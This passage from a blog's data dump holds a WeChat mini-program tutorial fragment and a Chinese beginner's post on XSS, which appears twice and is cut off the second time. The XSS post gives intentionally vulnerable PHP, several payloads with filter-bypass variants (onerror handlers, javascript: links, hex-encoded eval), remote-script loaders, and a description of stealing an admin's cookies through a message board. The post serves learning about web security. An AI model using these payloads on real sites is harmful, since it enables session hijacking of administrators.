我在学习&#123;&#123;courses[0]&#125;&#125;课程。</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"列表数据\"><a href=\"#列表数据\" class=\"headerlink\" title=\"列表数据\"></a>列表数据</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// pages/demo/data.js</span></span><br><span class=\"line\">Page(&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 通过 data 属性，初始化页面中用到的数据</span></span><br><span class=\"line\">    data: &#123;</span><br><span class=\"line\">        brands: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                name: <span class=\"string\">'耐克'</span>,</span><br><span class=\"line\">                origin: <span class=\"string\">'美国'</span>,</span><br><span class=\"line\">                category: [<span class=\"string\">'男装'</span>, <span class=\"string\">'女装'</span>, <span class=\"string\">'鞋'</span>, <span class=\"string\">'体育用品'</span>]</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                name: <span class=\"string\">'SK-II'</span>,</span><br><span class=\"line\">                origin: <span class=\"string\">'韩国'</span>,</span><br><span class=\"line\">                category: [<span class=\"string\">'防晒霜'</span>,<span class=\"string\">'面膜'</span>, <span class=\"string\">'洗护'</span>]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- pages/demo/data.wxml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">view</span> <span class=\"attr\">wx:for</span>=<span class=\"string\">\"&#123;&#123;brands&#125;&#125;\"</span> <span class=\"attr\">wx:for-index</span>=<span class=\"string\">\"k\"</span> <span class=\"attr\">wx:for-item</span>=<span class=\"string\">\"v\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">view</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span>&#123;&#123;k+1&#125;&#125; <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span> &#123;&#123;v.name&#125;&#125; <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span> &#123;&#123;v.origin&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">view</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">view</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">wx:for</span>=<span class=\"string\">\"&#123;&#123;v.category&#125;&#125;\"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">view</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">view</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>wx:for 属性将当前组件按着数组的长度动态创建，并且通过 index 变量可以访问到数组的索引值，通过item变量可以访问到单元值。</p>\n<h4 id=\"block\"><a href=\"#block\" class=\"headerlink\" title=\"block\"></a>block</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- pages/demo/data.wxml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">block</span> <span class=\"attr\">wx:for</span>=<span class=\"string\">\"&#123;&#123;users&#125;&#125;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span>&#123;&#123;item.age&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">block</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"条件数据\"><a href=\"#条件数据\" class=\"headerlink\" title=\"条件数据\"></a>条件数据</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">view</span> <span class=\"attr\">wx:for</span>=<span class=\"string\">\"&#123;&#123;users&#125;&#125;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span>&#123;&#123;index+1&#125;&#125; <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span> &#123;&#123;item.name&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span> &#123;&#123;item.age&#125;&#125; <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">wx:if</span>=<span class=\"string\">\"&#123;&#123;item.age &lt;= 14&#125;&#125;\"</span>&gt;</span> 儿童<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">wx:elif</span>=<span class=\"string\">\"&#123;&#123;item.age &lt;= 18&#125;&#125;\"</span>&gt;</span> 未成年<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">wx:else</span>&gt;</span> 成年人<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">view</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Page(&#123;</span><br><span class=\"line\">    data: &#123;</span><br><span class=\"line\">        users: [</span><br><span class=\"line\">            &#123;<span class=\"attr\">name</span>: <span class=\"string\">'小明'</span>, <span class=\"attr\">age</span>: <span class=\"number\">18</span>&#125;,</span><br><span class=\"line\">            &#123;<span class=\"attr\">name</span>: <span class=\"string\">'小红'</span>, <span class=\"attr\">age</span>: <span class=\"number\">13</span>&#125;,</span><br><span class=\"line\">            &#123;<span class=\"attr\">name</span>: <span class=\"string\">'小丽'</span>, <span class=\"attr\">age</span>: <span class=\"number\">19</span>&#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"事件触发\"><a href=\"#事件触发\" class=\"headerlink\" title=\"事件触发\"></a>事件触发</h4><p><strong>语法格式： bind:事件名称=”回调函数”</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"primary\"</span> <span class=\"attr\">bind:tap</span>=<span class=\"string\">\"sayHi\"</span>&gt;</span>点我试试<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">bind:focus</span>=<span class=\"string\">\"sayHi\"</span> <span class=\"attr\">bind:blur</span>=<span class=\"string\">\"sayBye\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// pages/demo/data.js</span></span><br><span class=\"line\">Page(&#123;</span><br><span class=\"line\">    sayHi: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'Hi~'</span>)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    sayHi: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'Hi~'</span>);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    sayBye: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">ev</span>) </span>&#123; <span class=\"comment\">// ev  时间对象</span></span><br><span class=\"line\">      \t<span class=\"built_in\">console</span>.log(ev);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'Bye~'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"事件冒泡\"><a href=\"#事件冒泡\" class=\"headerlink\" title=\"事件冒泡\"></a>事件冒泡</h4><ul>\n<li><p>子元素用bindtap绑定事件后，执行的时候，会冒泡到父元素（触发父亲元素上绑定的bindtap事件）</p>\n</li>\n<li><p>如果不想冒泡到父元素，可以用catchtap代替</p>\n</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">botton</span> <span class=\"attr\">catchtap</span>=<span class=\"string\">\"goDetail\"</span>&gt;</span>catchtap<span class=\"tag\">&lt;/<span class=\"name\">botton</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">botton</span> <span class=\"attr\">bindtap</span>=<span class=\"string\">\"goDetail\"</span>&gt;</span>bindtap<span class=\"tag\">&lt;/<span class=\"name\">botton</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"4-生命周期\"><a href=\"#4-生命周期\" class=\"headerlink\" title=\"4.生命周期\"></a>4.生命周期</h2><p><img src=\"/view/posts/6316/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png\" alt=\"微信小程序的生命周期\" style=\"zoom:67%;\"></p>\n"},{"title":"XXS攻击","abbrlink":"12cd2a8e","date":"2020-03-04T06:58:20.000Z","_content":"# XXS攻击\n\n参看：\n\n[XSS的原理分析与解剖](https://www.freebuf.com/articles/web/40520.html)\n\n[前端安全 -- XSS攻击](https://www.cnblogs.com/hellojesson/p/6386002.html)\n\n[web大前端开发中一些常见的安全性问题](https://blog.csdn.net/a401461843/article/details/77622299/)\n\n## 前言\n\n**XSS** 是面试时，hr提出来给我的，然后大体的浏览一遍，今天才查阅资料大体了解了它。\n\n**XSS** 攻击：攻击者向HTML页面传入恶意的HTML或JS代码，当用户浏览该页面时，恶意代码执行，达到攻击的目的。\n\n## 原理实现\n\n在本地搭建PHP环境（使用phpstudy安装），然后在`index.php`文件中输入一下代码：\n\n```php+HTML\n<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n  <title>XSS原理重现</title>\n</head>\n<body>\n<form action=\"\" method=\"get\">\n  <input type=\"text\" name=\"xss_input\">\n  <input type=\"submit\">\n</form>\n<hr>\n<?php\n  header(\"X-XSS-Protection: 0\"); // 0： 表示关闭浏览器的XSS防护机制\n  error_reporting(0); // 加上error_reporting(0);就不会弹出警告了\n  $xss = $_GET['xss_input'];\n  echo '<h5>你输入的字符为</h5><br />'.$xss;\n?>\n</body>\n</html>\n```\n\n现在在输入框中输入`abc`普通字符串，然后在页面中显示：\n\n![loading](XSS攻击/loading.gif)\n\n之后查看页面代码，就会发现页面上多了一行代码：\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n  <title>XSS原理重现</title>\n</head>\n<body>\n<form action=\"\" method=\"get\">\n  <input type=\"text\" name=\"xss_input\">\n  <input type=\"submit\">\n</form>\n<hr>\n    /*------多了的代码：123-------*/\n<h5>你输入的字符为</h5><br />123</body>\n</html>\n```\n\n此时，我要是在输入`<script>alert('xss')</script>`这种可以被解析的代码时：\n\n现在页面就显现出xss漏洞了。\n\n![loadinga](XSS攻击/loadinga.gif)\n\n之后查看页面代码，就会发现页面上多了一行代码：\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n  <title>XSS原理重现</title>\n</head>\n<body>\n<form action=\"\" method=\"get\">\n  <input type=\"text\" name=\"xss_input\">\n  <input type=\"submit\">\n</form>\n<hr>\n/*------多了的代码：<script>alert('xss')</script>-------*/\n// 代码出现在 br标签 和 body标签中\n<h5>你输入的字符为</h5><br /><script>alert('xss')</script></body>\n</html>\n```\n\n## xss利用输出环境来构造代码\n\n现在我要改变 **xss** 攻击：\n\n以上测试是在，标签中插入`scrpit`标签达到攻击的目的；现在我想要在`html页面标签`的属性中插入**xss**攻击代码。因此，当你我输入`<script>alert('xss')</script>`，不会显示出弹框了。\n\n### 测试代码\n\n```php+HTML\n\n<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n  <title>XSS利用输出的环境来构造代码</title>\n</head>\n\n<body>\n  <center>\n    <h6>把我们输入的字符串 输出到input里的value属性里</h6>\n    <form action=\"\" method=\"get\">\n      <h6>请输入你想显现的字符串</h6>\n      <input type=\"text\" name=\"xss_input_value\" value=\"输入\"><br>\n      <input type=\"submit\">\n    </form>\n    <hr>\n    <?php\n      header(\"X-XSS-Protection: 0\");\n      error_reporting(0);//加上error_reporting(0);就不会弹出警告了  \n      $xss = $_GET['xss_input_value'];\n      if(isset($xss)){\n      echo '<input type=\"text\" value=\"'.$xss.'\">';\n      }else{\n      echo '<input type=\"type\" value=\"输出\">';\n      }\n    ?>\n  </center>\n</body>\n\n</html>\n```\n\n页面效果：\n\n![1562307165857](XSS攻击/1562307165857.png)\n\n### 输入一\n\n当我在输入框输入`qwer`字符串时，会在输出框显示我输入的字符串：\n\n![loadinga](XSS攻击/loadinga-1562307323724.gif)\n\n此时网页代码：\n\n```html\n  <center>\n    <h6>把我们输入的字符串 输出到input里的value属性里</h6>\n    <form action=\"\" method=\"get\">\n      <h6>请输入你想显现的字符串</h6>\n      <input type=\"text\" name=\"xss_input_value\" value=\"输入\"><br>\n      <input type=\"submit\">\n    </form>\n    <hr>\n    <input type=\"text\" value=\"qwer\">  </center>\n\n```\n\n### 输入二\n\n现在我输入`<script>alert('xss')</script>`，字符串正常输入，明显的可以看到，并没有弹出对话框：\n\n![111](XSS攻击/111.gif)\n\n此时网页代码：\n\n```html\n<body>\n  <center>\n    <h6>把我们输入的字符串 输出到input里的value属性里</h6>\n    <form action=\"\" method=\"get\">\n      <h6>请输入你想显现的字符串</h6>\n      <input type=\"text\" name=\"xss_input_value\" value=\"输入\"><br>\n      <input type=\"submit\">\n    </form>\n    <hr>\n    <input type=\"text\" value=\"<script>alert('xss')</script>\">  </center>\n</body>\n\n```\n\n分析输出代码：\n\n```html\n<input type=\"text\" value=\"<script>alert('xss')</script>\">  </center>\n```\n\n### 输入三\n\n如果我输入`\">`，就会变成：\n\n```html\n<input type=\"text\" value=\"\"> \">  </center>\n```\n\ninput提前闭合了！之后的`\">`就被舍弃了，变成了普通文本。\n\n### 输入四\n\n如果我输入：`\"><script>alert('xss')</script>`\n\n显示效果：\n\n![asc](XSS攻击/asc.gif)\n\n### 输入五\n\n现在我不想显示弹框攻击了，我想触发某种事件实现攻击，那么就输入以下内容：\n\n```html\n\" onmousemove=\"alert('我就测试一下')\"\n```\n\n显示结果：\n\n![asc](XSS攻击/asc-1562308830171.gif)\n\n页面代码：\n\n```html\n  <center>\n    <h6>把我们输入的字符串 输出到input里的value属性里</h6>\n    <form action=\"\" method=\"get\">\n      <h6>请输入你想显现的字符串</h6>\n      <input type=\"text\" name=\"xss_input_value\" value=\"输入\"><br>\n      <input type=\"submit\">\n    </form>\n    <hr>\n    <input type=\"text\" value=\"\" onmousemove=\"alert('我就测试一下')\"\">  </center>\n\n```\n\n**说明：输入以后，鼠标在移动是触发事件，形成xss攻击。**\n\n那么，我在<textarea> 标签中显示呢？\n\n此时就这样输入：\n\n```html\n</textarea> <script>alert(‘xss’)</script> // 就可以实现弹窗了\n```\n\n## 过滤的解决办法\n\n假如说网站禁止过滤了script 这时该怎么办呢 ？\n\n那么就需要记住：**只要页面能触发你的js代码**\n\n有哪些方法呢？\n\n```html\n\n<!-- 当找不到图片名为1的文件时，执行alert('xss') -->\n<img scr=1 onerror=alert('xss')> \n\n<!-- 点击s时运行alert('xss') -->\n<a href=javascrip:alert('xss')>s</a> \n\n<!-- 利用iframe的scr来弹窗 -->\n<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>\n\n <!-- 过滤了alert来执行弹窗 -->\n<img src=\"1\" onerror=eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\")></img>\n```\n\n## xss的利用\n\n```html\n<script scr=\"js_url\"></script>\n\n<img src=x onerror=appendChild(createElement('script')).src='js_url' />\n```\n\n**比如我们在网站的留言区输入`<script scr=”js_url”></script>`**\n\n**当管理员进后台浏览留言的时候，就会触发**\n\n**然后管理员的cookies和后台地址还有管理员浏览器版本等等**\n\n**你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，**\n\n**就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。**\n","source":"_posts/XSS攻击.md","raw":"---\ntitle: XXS攻击\ncategories:\n  - JavasCript\ntags:\n  - JavasCript\nabbrlink: 12cd2a8e\ndate: 2020-03-04 14:58:20\n---\n# XXS攻击\n\n参看：\n\n[XSS的原理分析与解剖](https://www.freebuf.com/articles/web/40520.html)\n\n[前端安全 -- XSS攻击](https://www.cnblogs.com/hellojesson/p/6386002.html)\n\n[web大前端开发中一些常见的安全性问题](https://blog.csdn.net/a401461843/article/details/77622299/)\n\n## 前言\n\n**XSS** 是面试时，hr提出来给我的，然后大体的浏览一遍，今天才查阅资料大体了解了它。\n\n**XSS** 攻击：攻击者向HTML页面传入恶意的HTML或JS代码，当用户浏览该页面时，恶意代码执行，达到攻击的目的。\n\n## 原理实现\n\n在本地搭建PHP环境（使用phpstudy安装），然后在`index.php`文件中输入一下代码：\n\n```php+HTML\n<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n  <title>XSS原理重现</title>\n</head>\n<body>\n<form action=\"\" method=\"get\">\n  <input type=\"text\" name=\"xss_input\">\n  <input type=\"submit\">\n</form>\n<hr>\n<?php\n  header(\"X-XSS-Protection: 0\"); // 0： 表示关闭浏览器的XSS防护机制\n  error_reporting(0); // 加上error_reporting(0);就不会弹出警告了\n  $xss = $_GET['xss_input'];\n  echo '<h5>你输入的字符为</h5><br />'.$xss;\n?>\n</body>\n</html>\n```\n\n现在在输入框中输入`abc`普通字符串，然后在页面中显示：\n\n![loading](XSS攻击/loading.gif)\n\n之后查看页面代码，就会发现页面上多了一行代码：\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n  <title>XSS原理重现</title>\n</head>\n<body>\n<form action=\"\" method=\"get\">\n  <input type=\"text\" name=\"xss_input\">\n  <input type=\"submit\">\n</form>\n<hr>\n    /*------多了的代码：123-------*/\n<h5>你输入的字符为</h5><br />123</body>\n</html>\n```\n\n此时，我要是在输入`<script>alert('xss')</script>`这种可以被解析的代码时：\n\n现在页面就显现出xss漏洞了。\n\n![loadinga](XSS攻击/loadinga.gif)\n\n之后查看页面代码，就会发现页面上多了一行代码：\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n  <title>XSS原理重现</title>\n</head>\n<body>\n<form action=\"\" method=\"get\">\n  <input type=\"text\" name=\"xss_input\">\n  <input type=\"submit\">\n</form>\n<hr>\n/*------多了的代码：<script>alert('xss')</script>-------*/\n// 代码出现在 br标签 和 body标签中\n<h5>你输入的字符为</h5><br /><script>alert('xss')</script></body>\n</html>\n```\n\n## xss利用输出环境来构造代码\n\n现在我要改变 **xss** 攻击：\n\n以上测试是在，标签中插入`scrpit`标签达到攻击的目的；现在我想要在`html页面标签`的属性中插入**xss**攻击代码。因此，当你我输入`<script>alert('xss')</script>`，不会显示出弹框了。\n\n### 测试代码\n\n```php+HTML\n\n<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n  <title>XSS利用输出的环境来构造代码</title>\n</head>\n\n<body>\n  <center>\n    <h6>把我们输入的字符串 输出到input里的value属性里</h6>\n    <form action=\"\" method=\"get\">\n      <h6>请输入你想显现的字符串</h6>\n      <input type=\"text\" name=\"xss_input_value\" value=\"输入\"><br>\n      <input type=\"submit\">\n    </form>\n    <hr>\n    <?php\n      header(\"X-XSS-Protection: 0\");\n      error_reporting(0);//加上error_reporting(0);就不会弹出警告了  \n      $xss = $_GET['xss_input_value'];\n      if(isset($xss)){\n      echo '<input type=\"text\" value=\"'.$xss.'\">';\n      }else{\n      echo '<input type=\"type\" value=\"输出\">';\n      }\n    ?>\n  </center>\n</body>\n\n</html>\n```\n\n页面效果：\n\n![1562307165857](XSS攻击/1562307165857.png)\n\n### 输入一\n\n当我在输入框输入`qwer`字符串时，会在输出框显示我输入的字符串：\n\n![loadinga](XSS攻击/loadinga-1562307323724.gif)\n\n此时网页代码：\n\n```html\n  <center>\n    <h6>把我们输入的字符串 输出到input里的value属性里</h6>\n    <form action=\"\" method=\"get\">\n      <h6>请输入你想显现的字符串</h6>\n      <input type=\"text\" name=\"xss_input_value\" value=\"输入\"><br>\n      <input type=\"submit\">\n    </form>\n    <hr>\n    <input type=\"text\" value=\"qwer\">  </center>\n\n```\n\n### 输入二\n\n现在我输入`<script>alert('xss')</script>`，字符串正常输入，明显的可以看到，并没有弹出对话框：\n\n![111](XSS攻击/111.gif)\n\n此时网页代码：\n\n```html\n<body>\n  <center>\n    <h6>把我们输入的字符串 输出到input里的value属性里</h6>\n    <form action=\"\" method=\"get\">\n      <h6>请输入你想显现的字符串</h6>\n      <input type=\"text\" name=\"xss_input_value\" value=\"输入\"><br>\n      <input type=\"submit\">\n    </form>\n    <hr>\n    <input type=\"text\" value=\"<script>alert('xss')</script>\">  </center>\n</body>\n\n```\n\n分析输出代码：\n\n```html\n<input type=\"text\" value=\"<script>alert('xss')</script>\">  </center>\n```\n\n### 输入三\n\n如果我输入`\">`，就会变成：\n\n```html\n<input type=\"text\" value=\"\"> \">  </center>\n```\n\ninput提前闭合了！之后的`\">`就被舍弃了，变成了普通文本。\n\n### 输入四\n\n如果我输入：`\"><script>alert('xss')</script>`\n\n显示效果：\n\n![asc](XSS攻击/asc.gif)\n\n### 输入五\n\n现在我不想显示弹框攻击了，我想触发某种事件实现攻击，那么就输入以下内容：\n\n```html\n\" onmousemove=\"alert('我就测试一下')\"\n```\n\n显示结果：\n\n![asc](XSS攻击/asc-1562308830171.gif)\n\n页面代码：\n\n```html\n  <center>\n    <h6>把我们输入的字符串 输出到input里的value属性里</h6>\n    <form action=\"\" method=\"get\">\n      <h6>请输入你想显现的字符串</h6>\n      <input type=\"text\" name=\"xss_input_value\" value=\"输入\"><br>\n      <input type=\"submit\">\n    </form>\n    <hr>\n    <input type=\"text\" value=\"\" onmousemove=\"alert('我就测试一下')\"\">  </center>\n\n```\n\n**说明：输入以后，鼠标在移动是触发事件，形成xss攻击。**\n\n那么，我在<textarea> 标签中显示呢？\n\n此时就这样输入：\n\n```html\n</textarea> <script>alert(‘xss’)</script> // 就可以实现弹窗了\n```\n\n## 过滤的解决办法\n\n假如说网站禁止过滤了script 这时该怎么办呢 ？\n\n那么就需要记住：**只要页面能触发你的js代码**\n\n有哪些方法呢？\n\n```html\n\n<!-- 当找不到图片名为1的文件时，执行alert('xss') -->\n<img scr=1 onerror=alert('xss')> \n\n<!-- 点击s时运行alert('xss') -->\n<a href=javascrip:alert('xss')>s</a> \n\n<!-- 利用iframe的scr来弹窗 -->\n<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>\n\n <!-- 过滤了alert来执行弹窗 -->\n<img src=\"1\" onerror=eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\")></img>\n```\n\n## xss的利用\n\n```html\n<script scr=\"js_url\"></script>\n\n<img src=x onerror=appendChild(createElement('script')).src='js_url' />\n```\n\n**比如我们在网站的留言区输入`<script scr=”js_url”></script>`**\n\n**当管理员进后台浏览留言的时候，就会触发**\n\n**然后管理员的cookies和后台地址还有管理员浏览器版本等等**\n\n**你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，**\n\n**就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。**\n","slug":"XSS攻击","published":1,"updated":"2020-06-22T10:05:06.380Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr4u2r0005qrwtlb74a49x","content":"<h1 id=\"XXS攻击\"><a href=\"#XXS攻击\" class=\"headerlink\" title=\"XXS攻击\"></a>XXS攻击</h1><p>参看：</p>\n<p><a href=\"https://www.freebuf.com/articles/web/40520.html\" target=\"_blank\" rel=\"noopener\">XSS的原理分析与解剖</a></p>\n<p><a href=\"https://www.cnblogs.com/hellojesson/p/6386002.html\" target=\"_blank\" rel=\"noopener\">前端安全 – XSS攻击</a></p>\n<p><a href=\"https://blog.csdn.net/a401461843/article/details/77622299/\" target=\"_blank\" rel=\"noopener\">web大前端开发中一些常见的安全性问题</a></p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p><strong>XSS</strong> 是面试时，hr提出来给我的，然后大体的浏览一遍，今天才查阅资料大体了解了它。</p>\n<p><strong>XSS</strong> 攻击：攻击者向HTML页面传入恶意的HTML或JS代码，当用户浏览该页面时，恶意代码执行，达到攻击的目的。</p>\n<h2 id=\"原理实现\"><a href=\"#原理实现\" class=\"headerlink\" title=\"原理实现\"></a>原理实现</h2><p>在本地搭建PHP环境（使用phpstudy安装），然后在<code>index.php</code>文件中输入一下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span 